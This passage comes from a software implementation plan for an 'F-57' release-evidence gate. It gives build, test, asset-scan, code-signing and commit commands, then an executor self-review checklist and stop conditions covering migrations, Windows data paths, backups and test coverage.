npm --prefix clients/workbench ci && npm --prefix clients/workbench test -- --run && npm --prefix clients/workbench run build && npm --prefix clients/portal ci && npm --prefix clients/portal test -- --run && npm --prefix clients/portal run build && cargo xtask scan-web-assets clients/control-center/dist clients/workbench/dist clients/portal/dist`.

Transfer that exact digest-bound payload into the isolated Windows signing stage and run: `cargo xtask sign --input target/f57-release/release-payload.v1.jcs --tsa-policy installer/windows/rfc3161-tsa-policy.json --out target/f57-release/timestamped-release-evidence.v1.jcs`. The stage may reach only the configured internal TSA; TSA failure returns nonzero and produces no bundle.

Transfer the signed bundle back to the offline aggregator and run: `cargo xtask f57-release-gate --verify --evidence-root target/f57-ci-evidence --bundle target/f57-release/timestamped-release-evidence.v1.jcs`

Expected: PASS with zero warning, zero ignored mandatory test, zero unmapped requirement, zero registry mismatch, zero direct database/MCP/plugin bypass, all three freshly rebuilt/scanned frontends, signed definition age `<=72h`, approved W32Time/monotonic evidence, encrypted PostgreSQL TLS pre-DB helper evidence, verified-base-before-cut/base-WAL-PITR/attachment-pin evidence, native two-of-three recovery evidence, poisoned-latest multi-generation restore, non-shortened retention and one strict-CMS plus approved-internal-RFC3161 timestamped release-evidence bundle.

- [ ] **Step 7: Commit**

```bash
git add -- xtask/src/traceability.rs xtask/src/windowscheck.rs xtask/src/storagecheck.rs xtask/src/clientcheck.rs xtask/src/f57_release_gate.rs xtask/src/main.rs
git add -- xtask/src/e2e.rs xtask/Cargo.toml tools/release-gate/src/main.rs tools/release-gate/Cargo.toml tools/bench/src/main.rs tools/bench/Cargo.toml
git add -- scripts/windows/test-fresh-pg16.ps1 db/migrations/platform_core/V20261025093600__platform_core_backfill_f57_unpoliced_table_registry.sql crates/adapter/db-pg/src/foundation_check.rs crates/adapter/db-pg/Cargo.toml testkit/tests/f57_full_business_cycle.rs testkit/tests/f57_fault_matrix.rs
git add -- testkit/tests/f57_fresh_pg16.rs testkit/tests/f57_full_release_evidence.rs testkit/Cargo.toml docs/evidence/f57-release-evidence.schema.json docs/superpowers/reviews/f57-implementation-verification-template.md
git commit -m "test: add f57 full release evidence gate"
```

## 3. Executor self-review before Task 1

- [ ] Read the F-57 design, requirements traceability, authority register, P340 production profile and threat model in that order.
- [ ] Confirm the working tree and preserve unrelated user changes; execution should use an isolated worktree.
- [ ] Confirm no F-57 migration file already exists and the reserved versions remain unique.
- [ ] Confirm Task 1 updates the hard-coded architecture freezes in `xtask/src/archcheck/foundation.rs`, `frozen.rs` and `source.rs` at the same time as new foundation/platform types.
- [ ] Confirm every task first runs its named failing test, then the narrow passing test, then architecture/registry gates.
- [ ] Confirm no task enables the local model, active-active, Linux production deployment, direct client database access, arbitrary DLL injection or production scanner `NONE`.
- [ ] Confirm every customer-content path is constructed from `ValidatedDataRoot`; raw Windows paths are rejected by review and automated checks.
- [ ] Confirm current-scope business types are exact: STANDARD and DROP_SHIP certified; CONSIGNMENT, SUBSCRIPTION and LEASE are deferred provider seams.
- [ ] Confirm operating ledger scope is balanced internal operating journal/trial balance/period control, not statutory tax/payroll/year-end.
- [ ] Confirm connector scope is exact: core provider contracts plus certified LocalFile, Office formats, REST/Webhook/MCP, SMTP and AD/LDAP; vendor-specific connectors remain signed packages unless separately certified.
- [ ] Confirm a release cannot pass with skipped real PostgreSQL, Windows, four-client, P340, malware-scan, backup or clean-restore evidence.

## 4. Stop conditions

Stop the affected task and preserve evidence when any of these occurs:

1. a lower-authority document conflicts with F-57 and the authority register has no ruling;
2. a required migration version/path differs from the reserved block;
3. a customer-data path cannot be proven to reside on the HDD volume;
4. a package/provider asks for undeclared resource access or direct SQL;
5. an external side effect is `Unknown` and no provider reconciliation proof exists;
6. an authorization decision depends on a fixed job title instead of current capability grants;
7. a rollback would discard customer data or falsify audit history;
8. the client technology gate fails on any mandatory platform;
9. the P340, UPS, scanner, backup, clean restore or Windows Server evidence is absent;
10. a test is skipped while its requirement is claimed complete.

No product choice remains open in this plan. Future site-specific values—certificate subjects, AD domain, provider endpoints, retention periods, data growth, backup target IDs and measured RPO/RTO—are deployment evidence, not design decisions; absence keeps the affected capability disabled or uncertified.
